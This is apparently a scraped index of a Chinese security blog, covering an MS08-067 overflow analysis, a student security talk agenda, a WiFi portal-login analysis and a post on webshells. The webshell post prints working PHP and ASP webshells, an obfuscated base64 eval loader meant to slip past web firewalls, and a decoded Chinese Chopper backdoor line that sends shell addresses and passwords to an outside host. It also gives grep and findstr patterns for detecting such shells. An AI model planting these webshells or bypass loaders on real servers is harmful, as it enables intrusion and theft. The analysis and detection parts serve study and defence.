的码云已经更新修复了该漏洞\nhttps://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574\n","date":1506643200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1506643200,"objectID":"782be74589bf21edbfea26fc62344291","permalink":"https://p0st3r.github.io/post/ssv-93588/","publishdate":"2017-09-29T00:00:00Z","relpermalink":"/post/ssv-93588/","section":"post","summary":"该漏洞通过配置属性值，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除","tags":["SSV","Discuz","任意文件操作"],"title":"Discuz2.5-3.4任意文件操作漏洞","type":"post"},{"authors":[""],"categories":null,"content":"445端口 首先介绍一下这个引发了诸多特大漏洞的445端口。\nTCP 445端口主要运行两种服务：\n SMB 网络服务 MSRPC 网络服务  **SMB（Server Message Block，服务器消息块）**首先提供了 Windows 网络中最常用的远程文件与打印机共享网络服务，其次，SMB的命名管道是 MSRPC 协议认证和调用本地服务的承载传输层。\nSMB 作为应用层协议，其直接运行在TCP 445端口上，也可通过调用 NBT 的 TCP 139端口来接收数据。\n**MSRPC（Microsoft Remote Procedure Call，微软远程过程调用）**是对 DCE/RPC 在 Windows 系统下的重新改进和实现，用以支持Windows系统中的应用程序能够无缝地通过网络调用远程主机上服务进程中的过程。\nDCE/RPC 独立运行于网络传输层协议上，采用的网络传输层协议包括：\n ncacn_ip_tcp =\u0026gt; TCP 139 ncadg_ip_udp =\u0026gt; UDP 135 ncacn_np =\u0026gt; TCP 139、445  其中，主要使用的是 ncacn_np（SMB命名管道传输协议），也就是利用 SMB 命名管道机制作为 RPC 的承载传输协议（MSRPC over SMB）。\n只有少数如MS09-050是直接针对SMB服务的，而MSRPC作为调用大量本地服务进程的网络接口，常常被利用 MSRPC over SMB 为通道如MS08-067来攻击本地服务中存在的安全漏洞。\n0x01 MS08-067漏洞原理 MS08-067漏洞是通过 MSRPC over SMB 通道调用 Server 服务程序中的 NetPathCanonicalize 函数时触发的，而 NetPathCanonicalize 函数在远程访问其他主机时，会调用 NetpwPathCanonicalize 函数，对远程访问的路径进行规范化，而在 NetpwPathCanonicalize 函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。\n所谓路径规范化，就是将路径字符串中的【/】转换为【\\】，同时去除相对路径【.\\】和【..\\】。如：\n**/*/./** =\u0026gt; **\\*\\**\r**\\*\\..\\** =\u0026gt; **\\**\r在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【..\\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。\n路径处理流程 NetpwPathCanonicalize 函数并没有直接进行输入路径和规范化，而是继续调用了下级函数CanonicalizePathName 来进行路径整理，将待整理的路径字符串进行规范化，然后再保存到预先分配的输出路径缓冲区buffer中。\n路径处理流程：\n 检查待整理路径的第一个字符 调用msvcrt.dll模块的wcslen函数计算路径长度 调用msvcrt.dll模块的wcscat函数把待整理路径全部复制到新申请的内存中  \\4. 调用wcscpy函数，去掉待整理路径中第一个表示父目录的相对路径复制到strTemp，如：\n\\******\\..\\..\\*** =\u0026gt; \\..\\***\r5.循环调用wcscpy，直到路径整理完毕\n在这里我们知道了，在规范化复制时要寻找表示父目录的【..\\】字符串及其前面的一个【\\】字符串，将这一段去掉并将新路径复制。\n如图，第一次检查时去掉了第一个相对路径并复制到缓冲区\n但是，当【..\\】字符串在路径字符串的最前面时，那么其前面的一个【\\】就在缓冲区外面了，就是在这里产生了向前（低地址）的溢出。\n缓冲区溢出 需要明确的是，微软对路径规范化时的字符串复制可能出现的缓冲区溢出做了初步的防御。\n在每次向缓冲区中复制字符串时，无论是用 wcsccpy 还是 wcscat，在复制前总要比较源字符串的长度，保证长度小于某个值（207），否则不会继续复制，这一策略确保缓冲区不会向高地址溢出，即当前函数返回时不会发生问题。\n**但是注意，**在规范化表示路径，寻找父目录的【..\\】字符串前面的【\\】字符时，程序做了判断和边界检查：如果当前比较字符的地址与源字符串地址相同，就表明整个字符串已经查找完毕，程序就会停止查找。\n然而它唯独漏了一种情况，就是当父目录相对路径【..\\】字符串在源字符串的开头时，在开始查找时比较的字符串(【\\】到【..\\】)位于缓冲区之外，这导致了复制的字符串向低地址的溢出，造成函数wcscpy的返回地址被覆盖。\n0x02 漏洞还原分析 实验环境\n 靶机 Windows2003 SP0 EN 漏洞组件 netapi32.dll 工具 IDA Pro、OllyDbg  选择 Windows XP SP3 EN 系统主机作为分析环境，定位到包含该安全漏洞的系统模块netapi32.dll（路径C:\\Windows\\system32）和调用漏洞服务 Server 的进程 svchost.exe，目标进程命令行为\nC:\\Windows\\System32\\svchost.exe-k netsvcs\r用 IDA pro 打开 netapi32.dll，找到漏洞所在的 NetpwPathCanonicalize 函（每次运行堆栈中的地址会不同，但各函数的地址一样），如图在书中提到\n 查看该函数流程图，可以看到，此函数并没有直接进行输入路径的规范化， 而是继续调用了下级函数 CanonicalizePathName\n 然而在实际操作中并没有发现 CanonicalizePathName 这个函数，并且多种资料表明应当是调用 CanonPathName 函数进行规范化。\nIDA分析 NetpwPathCanonicalize 函数代码（F5 + 整理 + 主要代码）：\n该函数声明如下：\nDWORD NetpwPathCanonicalize(\rLPWSTR PathName, //需要标准化的路径\r LPWSTR Outbuf, //存储标准化后的路径的Buffer\r DWORD OutbufLen, //Buffer长度\r LPWSTR Prefix, //可选参数，当PathName是相对路径时有用\r LPDWORD PathType, //存储路径类型\r DWORD Flags // 保留，为0\r )\r动态调试 通过wmic查看命令行参数为svchost.exe -k netsvcs的进程pid\n打开OllyDbg，点击file-\u0026gt;attach，附着到svchost.exe进程上\nView-\u0026gt;Executable modules双击netapi32，在cpu指令窗口右键选Search for查找exec(label) in current module，找到函数NetpwPathCanonicalize，地址为71C44A3E，在此处设下断点。\n追踪漏洞触发过程 回到CPU指令窗口运行程序，然后攻击机Metasploit加载ms08_067_netapi模块并exploit\nNetpwPathCanonicalize中断 分析环境中的svchost程序会中断在 NetpwPathCanonicalize 函数的入口地址处。该函数的传入参数如下所示：\nesp [esp]\t* 注释 *\r00ECF924\t02248D34\t;指向待整理路径\r00ECF928\t022321D8\t;指向输出路径buffer\r00ECF92C\t000003F1\t;输出buffer的长度\r00ECF930\t02248FB0\t;指向prefix，值为 \\x5C\\x00 ，即unicode ‘\\’\r00ECF934\t02248FB4\t;指向路径类型，值为 0x1001\r00ECF938\t00000000\t;WORD Flags保留，值为0\rCanonicalizePathName中断 结合IDA pro对 NetpwPathCanonicalize 的流程分析，在 地址处将调用下一级函数 CanonPathName，在此地址设下断点。\n运行到此断点，然后跟踪函数 CanonPathName，传入参数如下所示：\n00F0F8FC\t00157570\t;指向prefix，值为\\x5C\\00，即Unicode\u0026#34;\\\u0026#34;\r00F0F900\t001572F4\t;指向待整理路径\r00F0F904\t02132E80\t;指向输出路径的buffer\r00F0F908\t000003F9\t;输出buffer的长度\r00F0F90C\t00000000\t;WORD Flag保留字，值为0\r从上两个函数的参数传递可以看出，函数 CanonPathName 进行路径整理，然后再保存到预先分配的输出路径缓冲区buffer中。\n待整理路径结构 在OD中查看待整理路径的结构，路径是Unicode字符串，以【\\x5C\\x00】(Unicode字符“\\”)开始，【\\x00\\x00】结束，中间包含一些随机的大小写字母，较长一段不可显示的字符是经过编码的Shellcode，其中最关键的是两个连在一起的父目录相对路径【....\\】。\n整个待整理路径形如：\n\\******\\..\\..\\***\r整理路径前的预操作 在待整理路径所在内存地址000C0F50处4字节上设内存访问断点\n按F9运行，会中断3次，前两次分别是检查待整理路径的第一个字符和调用wcslen函数，第三次是在调用wcscat函数。分析第三次传入栈中两个参数\n第一个是strDestination，指向一段以【\\x5c\\x00】开头的内存空间；第二个是strSource，指向上述待整理路径前两字节【\\x5c\\x00】后的内容。\n程序把待整理路径全部复制到strDestination，即0x001572F6处。在此4字节设断点，类型选择\u0026quot;Hardware, on access\u0026quot;DWord。\n复制路径到缓冲区 F9继续运行，第4次中断在0x77BD4010 ，内存里显示这里将src的前两个字符复制到了dest的【\\x5C\\x00】后面，这是由于这两个字节设了断点的原因。\n第5次中断在0x71C44B1C，位于wcscat函数内，内存显示已将src复制到dest，如图:\n第一次路径规范化 按F9运行，中断多次后停在内存0x77bd4d36处，通过栈可知此处属于wcscpy函数。此处调用该函数进行第一次路径规范化。如图\n当前参数src值为0x00EC6E0，指向【..***】;参数 strDestination 值为0x00ECF4DC，指向temp中的第一个字符【\\】。 显然，这次路径规范化即把待整理路径中第一个字符【\\】和第一个【..\\】相对路径之间的内容抛弃。\n而此时wcscpy源地址src在edx寄存器中，指向【..***】；目的地址dest在ecx寄存器中，指向待整理路径第一个字符【\\】，如图\n所以，这次字符串复制操作就是去掉第一个表示父目录的相对路径，即待整理路径temp中的第一个【\\】和第一个【..\\】之间的内容成为无用路径被抛弃。操作完成后，temp中的路径字符形如【..***】。\n第一次规范化后，待整理路径形如\n\\..\\***\r由于还有【..\\】，还需要进行一次规范化，而这第二次规范化正是玄机所在。\n第二次路径规范化 由于每次路径规范化都会调用wcscpy函数，接下来删除0x00ECF4DC的硬件断点，直接在wcscpy函数的入口地址0x77BD4D28处下断点。\nF9运行后中断在wcscpy函数入口0x77BD4D28处，调用wcscpy函数传入的参数\nesp\t[esp]\t* 注释 *\r00ECF4AC\t00ECF494\t目的地址，指向的内存区域值为\\x5c\\x00，即【\\】\r00ECF4B0\t00ECF4E2\t源地址，指向第二个相对路径【\\..\\】的最后一个斜杠\r正常情况下，这次规范化处理会和第一次执行同样的操作，去除第二个相对路径【..\\】，从而完成第二次的路径规范化。但这里出现了一个意外的情况，temp的首地址是0x00ECF4DC，而此次字符串复制操作的目的地址dest却在0x00ECF494，在temp之前，如图\n同时注意到，栈指针ESP值为0x00ECF4A8，该地址指向wcscpy函数的返回地址0x71C52FD4。ESP到复制目的dest地址0x00ECF494只有0x14字节，于是，函数wcscpy如果继续执行，将用源字符串src覆盖wcscpy函数的返回地址。\n执行到retn命令，可以看到返回地址变成了0x0100129E，，该地址的指令为：\n00100129E\tFFD6\tcall esi\r执行 call esi（ES=0x00F0F4DE）指令，正好将EIP指向复制尽量的字符串中构造好的第8字节空指令，接着是【\\xeb\\x62】（jmp 0x62），此jmp指令跳过中间的随机字符串，指向经过编码的Shellcode，如图\n所以这里是由于内存0x00F0F494处的一个【\\】(0x5C)，使得出现在处理父母了相对路径【..\\】时往前溢出了待处理路径，从而将字符串覆盖到函数wcscpy返回地址的位置，跳转到shellcode造成远程代码执行。\n正如前面所提到的，当【..\\】在源字符串开头的时候，在开始查找时，比较的字符位于缓冲区之外导致了向前的溢出。\n","date":1505174400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1505174400,"objectID":"d21a32766c1c21c53c6d9477d1665a8a","permalink":"https://p0st3r.github.io/publication/ms-08-067-analyise/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/publication/ms-08-067-analyise/","section":"publication","summary":"对著名的MS08-067漏洞进行了详细的原理讲解和复现分析。","tags":["CVE"],"title":"MS08-067漏洞原理及复现分析","type":"publication"},{"authors":[],"categories":null,"content":"议题安排 Xp0int团队介绍  giantbranch 简介：包含Xp0int团队简要介绍，Xp0int团队由来，Xp0int团队名称的多重含义，Xp0int团队活动，Xp0int团队的加入与退出，Xp0int团队及团队成员目前所获奖项，Xp0int团队所能获得的好处等。  Why is printf unsafe  mingo 简介：无论是在编写程序的时候使用printf报不安全的警告，还是老师上课说的printf存在安全隐患，都说明了printf确实不安全。那么为什么呢？2017 Xp0intCon，由mingo来分享why is printf unsafe、如何利用printf的格式化字符串漏洞进行任意内存的读写以及如何防御格式化字符串漏洞。  基于 Windows、Linux、Android 三大平台的 CTF 逆向题基本解题思路  梁家浩 简介：本次分享针对 Windows、Linux、Android 三大平台，分别对每个平台下面的逆向题作 ”介绍、工具、方法、做法“ 四个方面的介绍，给逆向初学者以及一些非逆向CTF选手提供逆向题的基本解题思路。  我的安全之路及比赛经历  giantbranch 简介：简述我的信息安全学习之路，来一个ctf的小入门，之后说一些比赛的经历，经验。  从CrackMe谈软件保护中的序列号保护技术  sherlly 简介：CTF比赛中，一般有Web, RE, Pwn, Misc四大类型，而其中的CrackMe可以说是RE类的一大题型了，本次分享将以一个简单的CrackMe程序作切入点，进而展开对软件保护中的序列号保护技术的分析总结，然后结合实战，分析前段日子刚刚结束的DDCTF第8题，最后总结一些个人在逆向上的经验。  WannaCry元凶：NSA方程式工具利用与分析  Lithium 前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，任何人都可以直接下载并远程攻击利用。最近利用本工具对测试环境进行了实验复现，对其原理进行了分析。  Anonymous communication network techniques  陈艺康 简介：主要介绍匿名通信网络的相关技术  sqlmap  pyz 简介：浅谈sqlmap之如何写sqlmap的tamper  告别伸手党！自己写python渗透小工具  lynn 简介：分享下在安全学习中python的一些应用，介绍python一些库，包括：scapy、beautifulsoup、socket、multiprocessing、PIL等，通过实例说明库的作用，例如：arp欺骗、嗅探、模拟SSH、TCP代理、获取验证码等。  SQL注入简单介绍  陈婉萍 简介：SQL注入是OWASP TOP 10之一，也是本人接触的第一个漏洞类型。本次分享简单介绍了sql注入的原理、数据库结构、分类以及以access注入为例的注入过程等。  CDLinux下的wifi入侵  沈德 简介：主要介绍如何利用CDLinux系统上的工具进行wifi密码破解，成功获取wifi密码。  一句话木马绕过和防御  莫锦成 简介：主要介绍什么是一句话木马，利用解析漏洞，数据库备份，文件上传，文件包含等方式生成和利用一句话木马，还提及了一些绕过安全狗的小知识。  大白话讲《网络安全法》  giantbranch, mm0rys 简介：以大白话讲解《网络安全法》，提醒同学们在学习信息安全的道路上一定要遵纪守法。  免责声明：  以上成员分享言论内容不代表Xp0int立场，所分享的内容仅作学习交流所用，个人造成的严重后果，Xp0int不负任何责任\n以上活动解释权归Xp0int团队所有\n","date":1497623400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1497623400,"objectID":"4bb7850b3c0de92b386f0668cd54916f","permalink":"https://p0st3r.github.io/talk/xp0intcon2017/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/xp0intcon2017/","section":"talk","summary":"Xp0intCon是Xp0int团队每年举办的一个校内分享会，由团队成员及部分团队外优秀的学生分享在信息安全领域所学的一些东西以及学习经验等feature.","tags":[],"title":"Xp0intCon2017","type":"talk"},{"authors":[""],"categories":["Hack"],"content":"0x00 PHP小马 表单中\n action属性为要提交的地址； PHP_SELF获取当前文件； DOCUMENT_ROOT获取当前运行脚本所在的文档根目录； textarea为多行文本输入框；  \u0026lt;?\r$path=$_POST[\u0026#39;path\u0026#39;];\r$data=$_POST[\u0026#39;data\u0026#39;];\r$file=fopen($path,\u0026#34;w+\u0026#34;);\rfwrite($file,$data);\rfclose($file);\r?\u0026gt;\r\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\r读取当前文件路径：\r\u0026lt;? echo $_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;];?\u0026gt;\u0026lt;/br\u0026gt;\r保存路径：\u0026lt;input name=\u0026#34;path\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\r写入内容：\u0026lt;br\u0026gt;\u0026lt;textarea name=\u0026#34;data\u0026#34; cols=\u0026#34;90\u0026#34; rows=\u0026#34;50\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/br\u0026gt;\r\u0026lt;input name=\u0026#34;\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;/\u0026gt;\r\u0026lt;/form\u0026gt;\r有密码验证的PHP小马：\n\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;\u0026lt;?=$_SERVER[\u0026#39;SERVER_NAME\u0026#39;]?\u0026gt;的后门小马\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;?php\rerror_reporting(0);//不显示错误信息\r$password=\u0026#34;xiaoxian\u0026#34;;\rif ($_GET[pass]==$password){//判断输入的密码是否正确\r if ($_POST){\r$path=$_POST[\u0026#39;path\u0026#39;];//从表单获取的上传的路径\r $data=$_POST[\u0026#39;data\u0026#39;];//从表单获取的上传的内容\r $file=fopen($path,\u0026#34;w+\u0026#34;);\rif(fwrite($file,$data))\recho \u0026#34;Succeeded!\u0026#34;;\relse\recho \u0026#34;Failed!\u0026#34;;\rfclose($file);\r}\relse{\recho \u0026#34;xiaoma.php with password by xiaoxian\u0026#34;;\r}\r?\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\r服务器的IP地址和域名为:\u0026lt;?=$_SERVER[\u0026#39;SERVER_NAME\u0026#39;]?\u0026gt;(\u0026lt;?=@gethostbyname($_SERVER[\u0026#39;SERVER_NAME\u0026#39;])?\u0026gt;)\u0026lt;br\u0026gt;\r当前目录路径:\r\u0026lt;?php echo $_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;];?\u0026gt;\u0026lt;/br\u0026gt;\r\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\r保存路径:\u0026lt;input name=\u0026#34;path\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\r保存内容:\u0026lt;br\u0026gt;\u0026lt;textarea name=\u0026#34;data\u0026#34; cols=\u0026#34;90\u0026#34; rows=\u0026#34;50\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/br\u0026gt;\r\u0026lt;input name=\u0026#34;\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;/\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;?php\r}else{ //输入密码错误时则一直在输入密码的界面\r?\u0026gt;\r\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt;\r密码:\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;pass\u0026#34; id=\u0026#34;pass\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;login\u0026#34; value=\u0026#34;Login in\u0026#34; /\u0026gt;\u0026lt;/form\u0026gt;\r\u0026lt;?php } ?\u0026gt;\r0x01 一句话木马实现原理和编写 客户端：\n\u0026lt;form action=http://10.10.10.144/1.asp method=post\u0026gt;\r\u0026lt;textarea name=xiaoxian cols=120 rows=10 width=45\u0026gt;\rset IP=server.CreateObject(\u0026#34;Adodb.Stream\u0026#34;)//建立流对象\rIP.Open\rIP.Type=2//以文本方式 IP.CharSet=\u0026#34;gb2312\u0026#34;//字体标准\rIP.writetext request(\u0026#34;newvalue\u0026#34;)\rIP.SaveToFile server.mappath(\u0026#34;new.asp\u0026#34;),2//将木马内容以覆盖文件的方式写入new.asp，2就是已覆盖的方式\rIP.Close\rset IP=nothing//释放对象\rresponse.redirect \u0026#34;new.asp\u0026#34;//转向new.asp\r\u0026lt;/textarea\u0026gt;\r\u0026lt;textarea name=newvalue cols=120 rows=10 width=45\u0026gt;这里填生成木马的代码\r\u0026lt;/textarea\u0026gt;\u0026lt;br\u0026gt;\u0026lt;center\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;input type=submit value=提交\u0026gt;\r\u0026lt;/form\u0026gt;\r服务端中有文件1.asp，内容为：\n\u0026lt;%execute request(\u0026#34;xiaoxian\u0026#34;)%\u0026gt;\r表单的作用就是把表单里的内容提交到服务器端的1.asp文件，而1.asp即为一句话木马，会执行提交的内容。简单地说，就是构造两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为new.asp的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了。第一个表单的名字和1.asp中的密码必须一样，而第二个表单的名字必须和IP.writetext request(\u0026ldquo;newvalue\u0026rdquo;) 里的newvalue一样。至此只要服务器有写的权限该表单所提交的大马内容就会被写入到new.asp中。即new.asp为我们的shell地址。\n0x02 一句话木马如何绕过WAF实现上传 这时候进行编码即可下面的是一个简单的编码例子，复杂的到网上下载即可：\n\u0026lt;?php\r$mt=\u0026#34;JF9QT1NU\u0026#34;;\r$ojj=\u0026#34;QGV2YWwole\u0026#34;;\r$hsa=\u0026#34;Wydlele4aW\u0026#34;;\r$fnx=\u0026#34;FveGlhbiddKTs=\u0026#34;;\r$zk=str_replace(\u0026#34;d\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;sdtdrd_redpdldadcde\u0026#34;);\r$ef=$zk(\u0026#34;z\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;zbazsze64_zdzeczodze\u0026#34;);\r$dva=$zk(\u0026#34;p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;pcprpepaptpe_fpupnpcptpipopn\u0026#34;);\r$zvm=$dva(\u0026#39;\u0026#39;,$ef($zk(\u0026#34;le\u0026#34;,\u0026#34;\u0026#34;,$ojj.$mt.$hsa.$fnx)));\r$zvm();\r?\u0026gt;\r0x03 中国菜刀一些技巧和后门分析 开启安全狗之后即使上传了一句话木马但是也是无法直接用菜刀连接的，将菜刀发送的信息通过Firefox的Hackbar来POST过去即可绕过。\n具体的效果要看不同种类、不同版本的WAF了，这里使用的是最新版的安全狗因为还是被过滤了。当然网上也有过狗版的菜刀，但是本人使用的版本效果并不好。\n如何检测菜刀是否存在后门？\n使用WSockExpert软件或其它抓包软来来选择需要监听的“中国菜刀”程序，开始监听后，用菜刀连接Webshell进行一些操作，然后查看抓到的包，找到Send即发送包，其中的内容含有密码xiaoxian和加密过的内容，接着对里面的内容解码就是（这个是据说是官网下载的菜刀，但是确实没看到有后门）：\n@eval (base64_decode($_POST[z0]));\r\u0026amp;z0=@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-\u0026gt;|\u0026#34;);;$D=base64_decode($_POST[\u0026#34;z1\u0026#34;]);$F=@opendir($D);if($F==NULL){echo(\u0026#34;ERROR:// Path Not Found Or No Permission!\u0026#34;);}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\u0026#34;/\u0026#34;.$N;$T=@date(\u0026#34;Y-m-d H:i:s\u0026#34;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\u0026#34;\\t\u0026#34;.$T.\u0026#34;\\t\u0026#34;.@filesize($P).\u0026#34;\\t\u0026#34;.$E.\u0026#34;\r\u0026#34;;if(@is_dir($P))$M.=$N.\u0026#34;/\u0026#34;.$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo(\u0026#34;|\u0026lt;-\u0026#34;);die();\r\u0026amp;z1=@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-\u0026gt;C:\\\\wce\\\\\r这是有后门的菜刀第一次解码的结果：\n@eval(base64_decode(\u0026#39;aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL3d3dy5hcGkuY29tLmRlL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9\u0026#39;));@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\u0026#34;-\u0026gt;|\u0026#34;);;$D=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if($D==\u0026#34;\u0026#34;)$D=dirname($_SERVER[\u0026#34;PATH_TRANSLATED\u0026#34;]);$R=\u0026#34;{$D}\\t\u0026#34;;if(substr($D,0,1)!=\u0026#34;/\u0026#34;){foreach(range(\u0026#34;A\u0026#34;,\u0026#34;Z\u0026#34;)\ras $L)if(is_dir(\u0026#34;{$L}:\u0026#34;))$R.=\u0026#34;{$L}:\u0026#34;;}$R.=\u0026#34;\\t\u0026#34;;$u=(function_exists(\u0026#39;posix_getegid\u0026#39;))?@posix_getpwuid(@posix_geteuid()):\u0026#39;\u0026#39;;$usr=($u)?$u[\u0026#39;name\u0026#39;]:@get_current_user();$R.=php_uname();$R.=\u0026#34;({$usr})\u0026#34;;print\r$R;;echo(\u0026#34;|\u0026lt;-\u0026#34;);die();\r将中间base64加密字段进行第二次解密：\nif($_COOKIE[\u0026#39;Lyke\u0026#39;]!=1){setcookie(\u0026#39;Lyke\u0026#39;,1);@file(\u0026#39;http://www.api.com.de/Api.php?Url=\u0026#39;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;REQUEST_URI\u0026#39;].\u0026#39;\u0026amp;Pass=\u0026#39;.key($_POST));}\r可以看到这个菜刀明显存在后门。\n另外，在X-Forwarded-For这里是值得怀疑的地方，因为这里的IP是别的地方的，网上还没找到关于这种情况是不是后门的相关内容。这个地方大家可以研究一下，个人觉得是比较隐蔽的后门吧，但是问题是我所用的几个版本的菜刀在X-Forwarded-For这里都是有这个别的地方的IP的。\n0x04 Linux、Windows下查找菜刀一句话木马 Linux：\n   使用egrep命令进行正则匹配 egrep -re ' \u0026lt;php\\s@eval[(]$POST[.+][)];?\u0026rsquo; *.php    Windows：\n 通过findstr命令加上正则表达式搜索文件 findstr /R \u0026ldquo;\u0026lt;php.@eval[(]$_POST.*[)];?\u0026rdquo; *.php  若是asp一句话木马，则需要修改正则表达式即可：\n egrep -re \u0026lsquo;[[]%@\\sPage\\sLanguage=.Jscript.%[](mailto:]/%/@/sPage/sLanguage=.Jscript./%[)][\u0026lt;]%eval.Request.Item.+unsafe\u0026rsquo; *.aspx findstr /R \u0026ldquo;[[]%@.Page.Language=.Jscript.%[](mailto:]/%/@.Page.Language=.Jscript./%[)][\u0026lt;]%eval.Request.Item.*unsafe\u0026rdquo; *.aspx  0x05 其他脚本后门分析 一般的方法就是，通过Firefox的F12即开发者工具到Network网络查看，如果在URL下还有访问其它网页的信息，那么基本就是存在后门。\n0x06 手动查找后门木马 1、系统的启动项，在运行输入msconfig，在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，可以使用360安全卫士等软件的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；\n2、查看系统关键目录system32和系统安装目录Windows下的文件。然后查看最新修改的文件中有没有可疑的可执行文件或dll文件，这两个地方都是木马最喜欢的藏身的地方了（记得先设置显示所有的文件和文件夹）；\n3、观察网络连接是否存在异常，还有输入netstat -ano命令查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于8000等端口就要注意了，8000是灰鸽子的默认端口。\n这里重点讲一下第三点：\n1、 查看进程：\nnetstat-an\rnetstat -ano 多显示一个PID，先查看established的进程中所连接的外部地址是否是一个可疑的、没见过的地址，如果本身主机没有进行什么网络访问的话就需要警惕了，先记住这个可疑进程的PID。\ntasklist /svc，输入这个命令，通过对应的PID找到对应的进程名。\n2、 查看服务：\n可以使用工具XueTr来进行更为简便的操作，使用其查看服务和进程等信息（注意的一点，微软服务的描述在最后都是由句号的，而第三方的服务是没有的）\n先右键到dll文件的路径中将dll文件删除，然后到相应的服务中将其删除掉，最后将可疑进程终止掉。\n","date":1495238400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1495238400,"objectID":"3ec9ee3471d1c5737d6f5b8d5d65157d","permalink":"https://p0st3r.github.io/post/webshell-bypass-strategy/","publishdate":"2017-05-20T00:00:00Z","relpermalink":"/post/webshell-bypass-strategy/","section":"post","summary":"0x00 PHP小马 表单中 action属性为要提交的地址； PHP_S","tags":["webshell","upload","bypass"],"title":"一些脚本后门的分析、编写及绕过技巧","type":"post"},{"authors":[""],"categories":["Hack"],"content":"初步分析认证交互 该校校园网WIFI采用H3C认证，认证地址为内网某服务器上。url为\rhttp://192.168.xxx.x:xxxx/portal/index_default.jsp\n查看DOM 发现了几个重要的函数。base64()、checkUserName()、encrypt()\nbase64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。\nbase64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。\n分析网络流 首先使用火狐的firebug+检查元素来分析网络流。\n当我们访问登陆页面时，发送GET请求并带一个i_p_pl的cookie\n尝试登陆，登陆成功跳转到\rhttp://192.168.xxx.x:xxxx/portal/page/loginSucc.jsp**，发送了*个GET请求，除去图片和脚本，此次登陆只向/portal/loginSucc.jsp发送了GET包，除了i_p_pl，还带有hello1、hello2两个个cookie，其中hello1为登陆发送的username，hello2暂不明其含义。\n在后来的测试中，发现hello2是【记住登陆】功能的参数，当hello2=false时不记住，hello2=true时记住并附带hello3、hello4、hello5参数，本来应当是可以利用这些cookie来绕过登陆直接请求认证的，不过考虑到其又要增加工作量，因此先放一边。\n这就很奇怪了，在整个登陆过程全部都是GET请求而没有POST请求，没有POST请求是怎么把用户名密码传输上去认证的呢？况且之前已经在DOM中发现了base64encode()和query()函数。难道用户名和密码是在GET时Cookie中传上去的？。虽然不用想就知道GET发送cookie来登陆很扯，但还是要研究一下cookie的含义。\n探究cookie含义 